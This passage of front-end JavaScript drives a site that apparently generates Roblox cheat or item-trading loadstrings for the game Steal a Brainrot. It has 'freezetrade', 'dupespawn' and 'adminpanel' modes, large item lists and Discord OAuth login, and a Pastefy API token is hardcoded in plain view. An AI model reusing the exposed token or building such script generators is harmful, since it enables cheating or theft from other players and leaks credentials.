document.addEventListener('DOMContentLoaded', () => {

    // ============================================================
    //  SISTEMA DE NOTIFICACIONES
    // ============================================================
    function showNotification(message, type = 'info', duration = 4000) {
        const container = document.getElementById('notificationContainer');
        if (!container) return;

        const icons = {
            success: '✅',
            error: '❌',
            warning: '⚠️',
            info: 'ℹ️'
        };

        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <span class="notification-icon">${icons[type] || 'ℹ️'}</span>
            <span class="notification-content">${message}</span>
        `;

        container.appendChild(notification);

        setTimeout(() => {
            notification.classList.add('hiding');
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
            }, 300);
        }, duration);
    }

    // ============================================================
    //  SISTEMA DE CONFIRMACIÓN PERSONALIZADO
    // ============================================================
    function showConfirm(message) {
        return new Promise((resolve) => {
            const modal = document.getElementById('confirmModal');
            const messageEl = document.getElementById('confirmMessage');
            const confirmOk = document.getElementById('confirmOkBtn');
            const confirmCancel = document.getElementById('confirmCancelBtn');
            const closeBtn = document.getElementById('closeConfirmBtn');

            messageEl.textContent = message;
            modal.classList.remove('hidden');

            const cleanup = () => {
                modal.classList.add('hidden');
                confirmOk.removeEventListener('click', onOk);
                confirmCancel.removeEventListener('click', onCancel);
                closeBtn.removeEventListener('click', onCancel);
                modal.removeEventListener('click', onOutsideClick);
            };

            const onOk = () => {
                cleanup();
                resolve(true);
            };

            const onCancel = () => {
                cleanup();
                resolve(false);
            };

            const onOutsideClick = (e) => {
                if (e.target === modal) {
                    onCancel();
                }
            };

            confirmOk.addEventListener('click', onOk);
            confirmCancel.addEventListener('click', onCancel);
            closeBtn.addEventListener('click', onCancel);
            modal.addEventListener('click', onOutsideClick);
        });
    }

    // ============================================================
    //  CONFIGURACIÓN DE DISCORD OAUTH
    // ============================================================
    const DISCORD_CLIENT_ID = '1518709938333941770';
    const DISCORD_REDIRECT_URI = 'https://oblivionhub.xyz/api/discord/callback';
    const DISCORD_AUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(DISCORD_REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;

    // ============================================================
    //  ESTADO DE AUTENTICACIÓN
    // ============================================================
    let isAuthenticated = false;
    let userData = null;
    let shortEnabled = false;

    const savedAuth = localStorage.getItem('oblivion_auth');
    if (savedAuth) {
        try {
            const parsed = JSON.parse(savedAuth);
            isAuthenticated = parsed.isAuthenticated || false;
            userData = parsed.userData || null;
        } catch (e) {}
    }

    // ============================================================
    //  CONFIGURACIÓN
    // ============================================================
    const PASTEFY_API_TOKEN = '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';

    // ============================================================
    //  REFERENCIAS DOM
    // ============================================================
    const signInBtn = document.getElementById('signInBtn');
    const linModal = document.getElementById('loginModal');
    const closeModalBtn = document.getElementById('closeModalBtn');
    const discordLoginBtn = document.getElementById('discordLoginBtn');
    const guestLoginBtn = document.getElementById('guestLoginBtn');
    const shortToggle = document.getElementById('shortToggle');
    const guestLockMessage = document.getElementById('guestLockMessage');
    const generateBtn = document.getElementById('generateBtn');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const secondLoadstring = document.getElementById('secondLoadstring');
    const customLoadstring = document.getElementById('customLoadstring');

    // ============================================================
    //  FUNCIONES DE AUTENTICACIÓN
    // ============================================================
    function updateUIForAuth() {
        if (isAuthenticated) {
            signInBtn.textContent = userData?.username ? `👤 ${userData.username}` : 'LOGGED IN';
            signInBtn.classList.add('logged-in');
            shortToggle.classList.remove('disabled');
            shortToggle.style.cursor = 'pointer';
            guestLockMessage.classList.add('hidden');
        } else {
            signInBtn.textContent = 'SIGN IN';
            signInBtn.classList.remove('logged-in');
            shortToggle.classList.add('disabled');
            shortToggle.style.cursor = 'not-allowed';
            if (shortToggle.classList.contains('on')) {
                shortToggle.classList.remove('on');
                const label = shortToggle.querySelector('.toggle-label');
                label.textContent = 'OFF';
                shortEnabled = false;
            }
            guestLockMessage.classList.remove('hidden');
        }
        localStorage.setItem('oblivion_auth', JSON.stringify({ isAuthenticated, userData }));
    }

    function loginAsGuest() {
        isAuthenticated = false;
        userData = { username: 'Guest', avatar: null };
        loginModal.classList.add('hidden');
        updateUIForAuth();
        showNotification('You are now using OBLIVION as Guest. Short Loadstring is disabled.', 'info');
    }

    function loginWithDiscord() {
        window.location.href = DISCORD_AUTH_URL;
    }

    function handleDiscordCallback() {
        const urlParams = new URLSearchParams(window.location.search);
        const authSuccess = urlParams.get('auth') === 'success';
        const username = urlParams.get('username') || 'Discord User';
        
        if (authSuccess) {
            isAuthenticated = true;
            userData = { username: username, avatar: null };
            localStorage.setItem('oblivion_auth', JSON.stringify({ isAuthenticated, userData }));
            window.history.replaceState({}, document.title, window.location.pathname);
            updateUIForAuth();
            showNotification(`✅ Welcome ${username}!`, 'success');
        }
    }

    // ============================================================
    //  EVENTOS DE AUTENTICACIÓN
    // ============================================================
    signInBtn.addEventListener('click', async () => {
        if (isAuthenticated) {
            const confirmed = await showConfirm('Do you want to log out?');
            if (confirmed) {
                isAuthenticated = false;
                userData = null;
                localStorage.removeItem('oblivion_auth');
                updateUIForAuth();
                showNotification('Logged out.', 'info');
            }
        } else {
            loginModal.classList.remove('hidden');
        }
    });

    closeModalBtn.addEventListener('click', () => {
        loginModal.classList.add('hidden');
    });

    loginModal.addEventListener('click', (e) => {
        if (e.target === loginModal) {
            loginModal.classList.add('hidden');
        }
    });

    discordLoginBtn.addEventListener('click', loginWithDiscord);
    guestLoginBtn.addEventListener('click', loginAsGuest);
    handleDiscordCallback();

    // ============================================================
    //  MODO DE EJECUCIÓN (5 opciones)
    // ============================================================
    function updateModeUI(selectedMode) {
        const modeConfig = {
            normal: { show: false, disabled: false, placeholder: '' },
            adminpanel: { show: false, disabled: true, placeholder: '' },
            freezetrade: { show: false, disabled: true, placeholder: '' },
            dupespawn: { show: false, disabled: true, placeholder: '' },
            custom: { show: true, disabled: false, placeholder: '✏️ Escribe tu código personalizado aquí...' }
        };

        const config = modeConfig[selectedMode] || modeConfig.custom;

        if (config.show) {
            secondLoadstring.classList.remove('hidden');
        } else {
            secondLoadstring.classList.add('hidden');
        }

        customLoadstring.disabled = config.disabled;
        customLoadstring.placeholder = config.placeholder;

        if (config.disabled) {
            customLoadstring.value = '';
            customLoadstring.style.opacity = '0.6';
            customLoadstring.style.cursor = 'not-allowed';
            customLoadstring.style.backgroundColor = 'rgba(13, 13, 13, 0.4)';
        } else {
            customLoadstring.style.opacity = '1';
            customLoadstring.style.cursor = 'text';
            customLoadstring.style.backgroundColor = 'rgba(13, 13, 13, 0.8)';
        }
    }

    modeButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            modeButtons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            updateModeUI(btn.dataset.mode);
        });
    });

    const activeBtn = document.querySelector('.mode-btn.active');
    if (activeBtn) {
        updateModeUI(activeBtn.dataset.mode);
    } else {
        const normalBtn = document.querySelector('.mode-btn[data-mode="normal"]');
        if (normalBtn) {
            normalBtn.classList.add('active');
            updateModeUI('normal');
        }
    }

    // ============================================================
    //  SHORT LOADSTRING TOGGLE
    // ============================================================
    shortToggle.addEventListener('click', (e) => {
        if (!isAuthenticated) {
            showNotification('⚠️ You must sign in with Discord to use Short Loadstring.', 'warning');
            return;
        }
        shortEnabled = !shortEnabled;
        shortToggle.classList.toggle('on', shortEnabled);
        const label = shortToggle.querySelector('.toggle-label');
        label.textContent = shortEnabled ? 'ON' : 'OFF';
    });

    // ============================================================
    //  TRADUCCIONES PARA EL MENSAJE DE ADVERTENCIA
    // ============================================================
    const allSelectionWarning = {
        es: "⚠️ Al seleccionar todos los brainrots es muy probable que el script falle y no te llegue invitación. Se recomienda usar el filtro de recomendado y luego buscar los otros faltantes que te puedan servir.",
        en: "⚠️ Selecting all brainrots is very likely to cause the script to fail and you won't receive an invitation. It is recommended to use the recommended filter and then search for the other missing ones that may be useful.",
        pt: "⚠️ Selecionar todos os brainrots é muito provável que o script falhe e você não receba um convite. Recomenda-se usar o filtro recomendado e depois procurar os outros que faltam e que podem ser úteis.",
        fr: "⚠️ Sélectionner tous les brainrots est très susceptible de faire échouer le script et vous ne recevrez pas d'invitation. Il est recommandé d'utiliser le filtre recommandé, puis de rechercher les autres manquants qui pourraient vous être utiles.",
        de: "⚠️ Die Auswahl aller Brainrots führt sehr wahrscheinlich dazu, dass das Skript fehlschlägt und Sie keine Einladung erhalten. Es wird empfohlen, den empfohlenen Filter zu verwenden und dann nach den anderen fehlenden zu suchen, die nützlich sein könnten.",
        it: "⚠️ Selezionare tutti i brainrots è molto probabile che lo script fallisca e non riceverai un invito. Si consiglia di utilizzare il filtro consigliato e poi cercare gli altri mancanti che potrebbero esserti utili.",
        nl: "⚠️ Het selecteren van alle brainrots zal er zeer waarschijnlijk toe leiden dat het script mislukt en je geen uitnodiging ontvangt. Het wordt aanbevolen om het aanbevolen filter te gebruiken en vervolgens te zoeken naar de andere ontbrekende die nuttig kunnen zijn.",
        ja: "⚠️ すべてのブレインロットを選択すると、スクリプトが失敗し、招待状が届かない可能性が非常に高くなります。推奨フィルターを使用してから、役立つ可能性のある他の不足しているものを検索することをお勧めします。",
        ko: "⚠️ 모든 브레인롯을 선택하면 스크립트가 실패하고 초대장을 받지 못할 가능성이 매우 높습니다. 권장 필터를 사용한 다음 유용할 수 있는 다른 누락된 항목을 검색하는 것이 좋습니다.",
        zh: "⚠️ 选择所有脑残片很可能导致脚本失败，您将无法收到邀请。建议使用推荐过滤器，然后搜索其他可能有用的缺失项。",
        ru: "⚠️ Выбор всех brainrots с большой вероятностью приведет к сбою скрипта, и вы не получите приглашение. Рекомендуется использовать рекомендуемый фильтр, а затем искать другие недостающие, которые могут быть полезны.",
        ar: "⚠️ تحديد جميع brainrots من المحتمل جدًا أن يتسبب في فشل البرنامج النصي ولن تتلقى دعوة. يوصى باستخدام عامل التصفية الموصى به ثم البحث عن العناصر المفقودة الأخرى التي قد تكون مفيدة.",
        hi: "⚠️ सभी ब्रेनरोट्स का चयन करने से स्क्रिप्ट के विफल होने की बहुत संभावना है और आपको निमंत्रण नहीं मिलेगा। अनुशंसित फ़िल्टर का उपयोग करने और फिर उपयोगी हो सकने वाले अन्य लापता लोगों को खोजने की सिफारिश की जाती है।"
    };

    function getUserLanguage() {
        const lang = navigator.language || navigator.languages?.[0] || 'en';
        const primary = lang.split('-')[0];
        return primary;
    }

    function getTranslatedWarning() {
        const lang = getUserLanguage();
        return allSelectionWarning[lang] || allSelectionWarning.en;
    }

    // ============================================================
    //  TODOS LOS BRAINROTS (COMPLETOS)
    // ============================================================
    const brainrotLists = {
        Common: [
            'Fluriflura', 'Holy Arepa', 'Lirilì Larilà', 'Noobini Pizzanini',
            'Noobini Santanini', 'Pipi Corni', 'Pipi Kiwi', 'Raccooni Jandelini',
            'Svinina Bombardino', 'Talpa Di Fero', 'Tartaragno', 'Tim Cheese'
        ],
        Rare: [
            'Bandito Bobritto', 'Boneca Ambalabu', 'Cacto Hipopotamo', 'Cupcake Koala',
            'Frogo Elfo', 'Gangster Footera', 'Pengolino Nuvoletto', 'Pinealotto Fruttarino',
            'Pipi Avocado', 'Ta Ta Ta Ta Sahur', 'Tric Trac Baraboom', 'Trippi Troppi'
        ],
        Epic: [
            'Avocadini Antilopini', 'Avocadini Guffo', 'Bambini Crostini', 'Bananita Dolphinita',
            'Brr Brr Patapim', 'Brri Brri Bicus Dicus Bombicus', 'Cappuccino Assassino',
            'Doi Doi Do', 'Frogato Pirato', 'Gato Celesto', 'Malame Amarele',
            'Mangolini Parrocini', 'Mummio Rappitto', 'Penguin Tree', 'Penguino Cocosino',
            'Perochello Lemonchello', 'Salamino Penguino', 'Ti Ti Ti Sahur',
            'Trulimero Trulicina', 'Wombo Rollo'
        ],
        Legendary: [
            'Ballerina Cappuccina', 'Bandito Axolito', 'Blueberrinni Octopusini',
            'Buho de Fuego', 'Buho del Cielo', 'Burbaloni Loliloli', 'Caramello Filtrello',
            'Chef Crabracadabra', 'Chimpanzini Bananini', 'Chocco Bunny', 'Clickerino Crabo',
            'Cocosini Mama', 'Electro Quacko', 'Glorbo Fruttodrillo', 'Lionel Cactuseli',
            'Pandaccini Bananini', 'Pi Pi Watermelon', 'Pipi Potato', 'Puffaball',
            'Quackula', 'Quivioli Ameleonni', 'Sealo Regalo', 'Seraphino Gruyero',
            'Sigma Boy', 'Sigma Girl', 'Strawberrelli Flamingelli'
        ],
        Mythic: [
            'Avocadorilla', 'Bananito Bandito', 'Bee Loco', 'Berenjello Angello',
            'Bombardiro Crocodilo', 'Bombombini Gusini', 'Brutto Gialutto', 'Bucketoro',
            'Cachorrito Melonito', 'Carloo', 'Carrotini Brainini', 'Cavallo Virtuoso',
            'Centrucci Nuclucci', 'Cocoteddy', 'Fizzy Soda', 'Frigo Camelo',
            'Ganganzelli Trulala', 'Gorillo Subwoofero', 'Gorillo Watermelondrillo',
            'Harpuccino', 'Jacko Spaventosa', 'Jingle Jingle Sahur', 'Lerulerulerule',
            'Los Noobinis', 'Lucky Block', 'Magi Ribbitini', 'Orangutini Ananassini',
            'Orbi Mochi', 'Rhino Helicopterino', 'Rhino Toasterino', 'Spioniro Golubiro',
            'Spongini Quackini', 'Stoppo Luminino', 'Te Te Te Sahur', 'Tigrilini Watermelini',
            'Tob Tobi Tobi', 'Toiletto Focaccino', 'Tracoducotulu Delapeladustuz',
            'Tree Tree Tree Sahur', 'Zibra Zubra Zibralini'
        ],
        'Brainrot God': [
            'Alessio', 'Anpali Babel', 'Appelini', 'Aquanaut', 'Astrolero Cervalero',
            'Ballerina Peppermintina', 'Ballerino Lololo', 'Bambu Bambu Sahur',
            'Belula Beluga', 'Boba Panda', 'Bombardini Tortinii', 'Brasilini Berimbini',
            'Brr es Teh Patipum', 'Buho de Noelo', 'Bulbito Bandito Traktorito',
            'Bunny Tralala', 'Cacasito Satalito', 'Capi Taco', 'Cappuccino Clownino',
            'Chihuanini Taconini', 'Chrismasmamat', 'Clovkur Kurkur', 'Cocoa Assassino',
            'Cocofanto Elefanto', 'Cola Cat', 'Corn Corn Corn Sahur', 'Crabbo Limonetta',
            'Divino Platypio', 'Dolphini Jetskini', 'Dumborino Miracello', 'Eggdin Egg Egg Dun',
            'Espresso Signora', 'Extinct Ballerina', 'Flippo Marino', 'Frio Ninja',
            'Gattatino Nyanino', 'Gattito Tacoto', 'Ginger Cisterna', 'Ginger Globo',
            'Girafa Celestre', 'Granchiello Spiritell', 'Jacko Jack Jack', 'Karkerheart Luvkur',
            'Krupuk Pagi Pagi', 'Las Capuchinas', 'Lazy Ducky', 'Lemonita Splashita',
            'Los Bombinitos', 'Los Chihuaninis', 'Los Crocodillitos', 'Los Gattitos',
            'Los Orcalitos', 'Los Tipi Tacos', 'Los Tungtungtungcitos', 'Lucky Block',
            'Lumaca Malefica', 'Luv Luv Luv', 'Mastodontico Telepiedone', 'Matteo',
            'Money Money Man', 'Mummy Ambalabu', 'Noo La Polizia', 'Odin Din Din Dun',
            'Orcalero Orcala', 'Orcalita Orcala', 'Pakrahmatmamat', 'Pakrahmatmatina',
            'Pandanini Frostini', 'Patteo', 'Piccione Macchina', 'Piccionetta Macchina',
            'Pineaplino', 'Pop Pop Sahur', 'Pretzo Robo', 'Robo Grafito', 'Skull Skull Skull',
            'Snailenzo', 'Squalanana', 'Sundrilla Sundae', 'Tartaruga Cisterna',
            'Tenini Ballini', 'Tentacolo Tecnico', 'Tigroligre Frutonni', 'Tipi Topi Taco',
            'Tootini Shrimpini', 'Tortuginni Sandcastlini', 'Tractoro Dinosauro',
            'Tralalero Tralala', 'Tralalita Tralala', 'Trenostruzzo Turbo 3000',
            'Trenotubo Axolotrico 9000', 'Trippi Troppi Troppa Trippa', 'Tukanno Bananno',
            'Unclito Samito', 'Urubini Flamenguini', 'Vampira Cappucina', 'Yeti Claus'
        ],
        Secret: [
            '1x1x1x1', '25', '67', 'Abyssaloco', 'Agarrini la Palini', 'Antonio',
            'Aquarino', 'Arcadopus', 'Arcadragon', 'Bacuru and Egguru', 'Bananito',
            'Baskito', 'Bearito Cabinito', 'Berryno', 'Bisonte Giuppitere',
            'Blackhole Goat', 'Boatito Auratito', 'Bombardiro Vaccariro', 'Boppin Bunny',
            'Brunito Marsito', 'Buho de Volto', 'Bunito Bunito Spinito',
            'Bunny Bunny Bunny Sahur', 'Bunny and Eggy', 'Bunnyman', 'Buntteo',
            'Burguro And Fryuro', 'Burrito Bandito', 'Camera Ramena', 'Capitano Gullini',
            'Capitano Moby', 'Cash or Card', 'Caylusaurus', 'Celestial Pegasus',
            'Celularcini Viciosini', 'Cerberus', 'Chachechi', 'Chicleteira Bicicleteira',
            'Chicleteira Cupideira', 'Chicleteira Noelteira', 'Chicleteira Surfeiteira',
            'Chicleteirina Bicicleteirina', 'Chill Puppy', 'Chillin Chili', 'Chimnino',
            'Chipso and Queso', 'Churrito Bunnito', 'Cigno Fulgoro', 'Cloverat Clapat',
            'Coco and Mango', 'Cooki and Milki', 'Craburger', 'Cuadramat and Pakrahmatmamat',
            'Cupid Cupid Sahur', 'Cupid Hotspot', 'DJ Panda', 'Digi Narwhal',
            'Donkeyturbo Express', 'Dragon Aquanini', 'Dragon Cannelloni',
            'Dragon Gingerini', 'Dug dug dug', 'Duggy Bros', 'Dul Dul Dul',
            'Easter Easter Easter Sahur', 'Eid Eid Eid Sahur', 'Elefanto Frigo',
            'Esok Sekolah', 'Eviledon', 'Extinct Matteo', 'Extinct Tralalero',
            'Festive 67', 'Fishboard', 'Fishino Clownino', 'Flancito', 'Flipa Sandala',
            'Fortunu and Cashuru', 'Foxini Lanternini', 'Fragola La La La',
            'Fragrama and Chocrama', 'Frankentteo', 'Frullato Framingo', 'Futbolini Skatini',
            'GOAT', 'Garama and Madundung', 'Gelato Lumacho', 'Giftini Spyderini',
            'Ginger Gerat', 'Girafini Raftini', 'Glaciator', 'Globa Steppa',
            'Gobblino Uniciclino', 'Gold Egg', 'Gold Elf', 'Gold Gold Gold',
            'Graipuss Medussi', 'Granny', 'Granny', 'Griffin', 'Guerriro Digitale',
            'Guest 666', 'Gym Bros', 'Ho Ho Ho Sahur', 'Hopilikalika Hopilikalako',
            'Horegini Boom', 'Hydra Bunny', 'Hydra Dragon Cannelloni', 'Jackorilla',
            'Jelly Moby', 'Job Job Job Sahur', 'John Doe', 'Jolly Jolly Sahur',
            'Kalika Bros', 'Karker Sahur', 'Karkerkar Kurkur', 'Ketchuru and Musturu',
            'Ketupat Bros', 'Ketupat Kepat', 'Kraken', 'La Anniversary Grande',
            'La Casa Boo', 'La Cucaracha', 'La Easter Grande', 'La Extinct Grande',
            'La Food Combinasion', 'La Ginger Sekolah', 'La Grande Combinasion',
            'La Jolly Grande', 'La Karkerkar Combinasion', 'La Lucky Grande',
            'La Romantic Grande', 'La Sahur Combinasion', 'La Secret Combinasion',
            'La Spooky Grande', 'La Summer Grande', 'La Supreme Combinasion',
            'La Taco Combinasion', 'La Vacca Jacko Linterino', 'La Vacca Lepre Lepreino',
            'La Vacca Prese Presente', 'La Vacca Saturno Saturnita', 'Las Sis',
            'Las Tralaleritas', 'Las Vaquitas Saturnitas', 'Lavadorito Spinito',
            'List List List Sahur', 'Los 25', 'Los 67', 'Los Amigos', 'Los Bros',
            'Los Bunitos', 'Los Burritos', 'Los Candies', 'Los Chicleteiras',
            'Los Chillis', 'Los Combinasionas', 'Los Cucarachas', 'Los Cupids',
            'Los Fruits', 'Los Hackers', 'Los Hotspotsitos', 'Los Jobcitos',
            'Los Jolly Combinasionas', 'Los Karkeritos', 'Los Mariachis', 'Los Matteos',
            'Los Mi Gatitos', 'Los Mobilis', 'Los Nooo My Hotspotsitos', 'Los Planitos',
            'Los Primos', 'Los Puggies', 'Los Quesadillas', 'Los Sekolahs',
            'Los Spaghettis', 'Los Spooky Combinasionas', 'Los Spyderinis',
            'Los Sweethearts', 'Los Tacoritas', 'Los Tortus', 'Los Tralaleritos',
            'Los Trios', 'Love Love Bear', 'Love Love Love Sahur', 'Lovin Rose',
            'Luck Luck Luck Sahur', 'Lucky Block', 'Mariachi Corazoni', 'Mi Gatito',
            'Mieteteira Bicicleteira', 'Money Money Bros', 'Money Money Puggy',
            'Money Money Reindeer', 'Nacho Spyder', 'Naughty Naughty', 'Noo my Candy',
            'Noo my Eggs', 'Noo my Gold', 'Noo my Heart', 'Noo my Present',
            'Noo my examine', 'Nooo My Hotspot', 'Nuclearo Dinossauro', 'Octoball',
            'Ombrello Topolino', 'Orcaledon', 'Pancake and Syrup', 'Paradiso Axolottino',
            'Perrito Burrito', 'Pirulitoita Bicicleteira', 'Please my Present',
            'Popcuru and Fizzuru', 'Pot Hotspot', 'Pot Pumpkin', 'Pumpkini Spyderini',
            'Quackini Snackini', 'Quesadilla Crocodila', 'Quesadillo Vampiro',
            'Rang Ring Bus', 'Reindeer Tralala', 'Reinito Sleighito', 'Rico Dinero',
            'Rocco Disco', 'Rocketini Frostini', 'Rosetti Tualetti', 'Rosey and Teddy',
            'Rubrikiko', 'Sammyni Cakini', 'Sammyni Fattini', 'Sammyni Spyderini',
            'Sand Sand Sand', 'Santa Hotspot', 'Santteo', 'Serafinna Medusella',
            'Signore Carapace', 'Snailo Clovero', 'Spaghetti Tualetti', 'Spinny Hammy',
            'Spooky and Pumpky', 'Steakini Fattini', 'Strawberrita', 'Sushi Inu',
            'Swag Soda', 'Swaggy Bros', 'Tacorillo Crocodillo', 'Tacorita Bicicleta',
            'Tang Tang Keletang', 'Telemorte', 'Tictac Sahur', 'Tirilikalika Tirilikalako',
            'To to to Sahur', 'Torrtuginni Dragonfrutini', 'Tralaledon', 'Trickolino', 'Triplito Tralaleritos',
            'Tuff Toucan', 'Ventoliero Pavonero', 'Venuspino', 'Vulturino Skeletono',
            'W or L', 'Yess my examine', 'Zombie Tralala', '4th Bros', 'Capitano Americano', 
            'Bufalino Boomberino', 'Esok Goala', 'Los Tangcitos', 'Los Tictacs', 'Los Admins', 'Moby Bros', 'Var Var Var'
        ],
        OG: [
            'Headless Horseman', 'John Pork', 'Meowl', 'Skibidi Toilet',
            'Strawberry Elephant'
        ],
        Easter: [
            'Baskito Egg', 'Bunny Bunny Bunny Sahur Egg', 'Bunny Tralala Egg',
            'Buntteo Egg', 'Churrito Bunnito Egg', 'Easter Easter Easter Sahur Egg',
            'Egg Lucky Block', 'Eggdin Egg Egg Dun Egg', 'Hopilikalika Hopilikalako Egg',
            'Hydra Bunny Egg', 'Los Bunitos Egg', 'Noo my Eggs Egg',
            'Premium Egg Lucky Block', 'Quackini Snackini Egg'
        ],
        Summer: ['Octo Lucky Block', 'Premium Octo Lucky Block'],
        Taco: ['Los Taco Blocks', 'Lucky Block'],
        'St Patrick\'s': ['Leprechaun Lucky Block', 'Premium Leprechaun Lucky Block'],
        Festive: ['Festive Lucky Block', 'Premium Festive Lucky Block'],
        Valentines: ['Heart Lucky Block', 'Premium Heart Lucky Block'],
        Admin: ['Los Lucky Blocks', 'Lucky Block'],
        Spooky: ['Spooky Lucky Block']
    };

    // ============================================================
    //  LISTA DE RECOMMENDED
    // ============================================================
    const recommendedNames = [
        'Headless Horseman', 'Signore Carapace', 'Arcadragon', 'Elefanto Frigo',
        'Strawberry Elephant', 'Pancake and Syrup', 'Love Love Bear', 'Antonio',
        'Meowl', 'Skibidi Toilet', 'Rico Dinero', 'Griffin', 'Dragon Gingerini',
        'Fishino Clownino', 'La Supreme Combinasion', 'Ginger Gerat',
        'Tirilikalika Tirilikalako', 'Kalika Bros', 'Digi Narwhal', 'Hydra Bunny',
        'Dragon Cannelloni', 'Los Hackers', 'Hydra Dragon Cannelloni',
        'Bunny and Eggy', 'Duggy Bros', 'Dug Dug Dug', 'Ketupat Bros', 'John Doe',
        'La Casa Boo', 'Foxini Lanternini', 'Quackini Snackini', 'Los Chillis',
        'Guest 666', 'Cerberus', 'Rosey and Teddy', 'Reinito Sleighito',
        'Fragola La La La', 'Gym Bros', 'Spooky and Pumpky', 'Cloverat Clapat',
        'Cooki and Milki', 'Cash or Card', 'Fortunu and Cashuru', 'Jolly Jolly Sahur',
        'Capitano Moby', 'Fragrama and Chocrama', 'Chillin Chili', 'Los Sekolahs',
        'Sammyni Fattini', 'Los Amigos', 'Money Money Reindeer', 'Boppin Bunny',
        'Festive 67', 'Money Money Bros', 'Tralaledon', 'La Food Combinasion',
        'Celularcini Viciosini', 'Hopilikalika Hopilikalako', 'Los Tacoritas',
        'Swaggy Bros', 'Los Spaghettis', 'Popcuru and Fizzuru', 'Garama and Madundung',
        'Celestial Pegasus', 'La Easter Grande', 'Gold Gold Gold', 'Nacho Spyder',
        'Orcaledon', 'Los Mariachis', 'Burguro And Fryuro', 'Lovin Rose', 'W or L',
        'La Ginger Sekolah', 'Chipso and Queso', 'Los Primos', 'Swag Soda',
        'Los Hotspotsitos', 'La Taco Combinasion', 'La Romantic Grande', 'Eviledon',
        'Los Bros', 'Las Sis', 'Tictac Sahur', 'La Secret Combinasion',
        'La Lucky Grande', 'Ketchuru and Musturu', 'Gobblino Uniciclino',
        'Agarrini la Palini', 'Rosetti Tualetti', 'Tacorita Bicicleta',
        'Ventoliero Pavonero', 'John Pork', 'Lazy Ducky', 'Pineaplino',
        'Noo my examine', 'Rhino Helicopterino', 'Brutto Gialutto',
        'Tob Tobi Tobi', 'Centrucci Nuclucci', 'Caramello Filtrello',
        'Ganganzelli Trulala', 'Avocadorilla', 'Malame Amarele',
        'Raccooni Jandelini', 'La Sahur Combinasion', 'Karker Sahur',
        'Unclito Samito', 'Abyssaloco', 'Rubrikiko', 'La Anniversary Grande',
        'Jelly Moby', 'Sammyni Cakini', 'Lavadorito Spinito',
        'Donkeyturbo Express', 'Los Mi Gatitos', 'Telemorte',
        'Statutino Libertino', 'Los Jolly Combinasionas',
        'Please my Present', 'Bunito Bunito Spinito',
        'La Karkerkar Combinasion', 'Extinct Matteo', 'Coco and Mango',
        'Dragon Aquanini', 'Pretzo Robo', 'Kraken', 'Venuspino',
        'Bearito Cabinito', 'Sand Sand Sand', 'Globa Steppa',
        'Frullato Flamingo', 'La Summer Grande', 'Caylusaurus',
        'Steakini Fattini', 'Stoppo Luminino', 'Buho de Fuego',
        'Esok Goala', 'Capitano Americano', 'Bufalino Boomberino',
        'Tuff Toucan', 'Moby Bros', 'Los Admins', 'Los Tictacs',
        'Los Tangcitos', 'Los Fruits', 'Var Var Var'
    ];

    const brainrotData = [];
    for (const [rarity, names] of Object.entries(brainrotLists)) {
        names.forEach(name => {
            const isRecommended = recommendedNames.includes(name);
            brainrotData.push({ name, rarity, recommended: isRecommended });
        });
    }

    // ============================================================
    //  DATOS DE SKINS Y GEARS
    // ============================================================
    const skinItems = [
        'Rose', 'Gingerbread', 'Halloween', 'Christmas', 'Bunny Basket',
        'Summer', 'Pot of Gold', 'Taco', 'Octo', 'Valentines',
        'Easter', 'Lucky', 'Aquatic'
    ];

    const gearItems = [
        "Santa's Sleigh", "Cupid's Wings", "Witch's Broom", "Waverider",
        "Yin Yang Slap", "Cursed Slap", "Cyber Slap", "Divine Slap",
        "Bloodmoon Slap", "Radioactive Slap", "Rainbow Slap",
        "Rainbow Hammer", "Bloodmoon Hammer", "Radioactive Airstrike",
        "Yin Yang Lamp", "Demon's Head", "Lava Slap", "Lava Blaster",
        "Alien Slap", "Blackhole Bomb", "Candy Sentry"
    ];

    // ============================================================
    //  FUNCIONES DE RENDERIZADO
    // ============================================================
    function renderPills(containerId, items, searchId, counterId, allId, noneId) {
        const container = document.getElementById(containerId);
        const searchInput = document.getElementById(searchId);
        const counterSpan = document.getElementById(counterId);
        const allBtn = document.getElementById(allId);
        const noneBtn = document.getElementById(noneId);

        const selected = new Set();
        let filteredItems = [...items];

        function render() {
            const searchTerm = searchInput.value.toLowerCase().trim();
            filteredItems = items.filter(item => item.toLowerCase().includes(searchTerm));

            container.innerHTML = '';
            filteredItems.forEach(item => {
                const pill = document.createElement('span');
                pill.className = 'pill';
                if (selected.has(item)) pill.classList.add('selected');
                pill.textContent = item;
                pill.dataset.value = item;

                pill.addEventListener('click', () => {
                    if (selected.has(item)) {
                        selected.delete(item);
                        pill.classList.remove('selected');
                    } else {
                        selected.add(item);
                        pill.classList.add('selected');
                    }
                    updateCounter();
                });

                container.appendChild(pill);
            });
            updateCounter();
        }

        function updateCounter() {
            const visiblePills = container.querySelectorAll('.pill');
            let selectedCount = 0;
            visiblePills.forEach(pill => {
                if (selected.has(pill.dataset.value)) selectedCount++;
            });
            counterSpan.textContent = `${selectedCount} SELECTED`;
        }

        allBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.add(val);
                pill.classList.add('selected');
            });
            updateCounter();
        });

        noneBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.delete(val);
                pill.classList.remove('selected');
            });
            updateCounter();
        });

        searchInput.addEventListener('input', render);
        render();
        return selected;
    }

    function renderBrainrots() {
        const container = document.getElementById('brainrotsContainer');
        const searchInput = document.getElementById('brainrotsSearch');
        const counterSpan = document.getElementById('brainrotsCounter');
        const allBtn = document.getElementById('brainrotsAll');
        const noneBtn = document.getElementById('brainrotsNone');
        const filterBtns = document.querySelectorAll('.filter-btn');

        const selected = new Set();
        let currentFilter = 'all';
        let searchTerm = '';

        function getFilteredItems() {
            let filtered = brainrotData;
            if (searchTerm) {
                filtered = filtered.filter(item =>
                    item.name.toLowerCase().includes(searchTerm.toLowerCase())
                );
            }
            if (currentFilter === 'all') {
                // todos
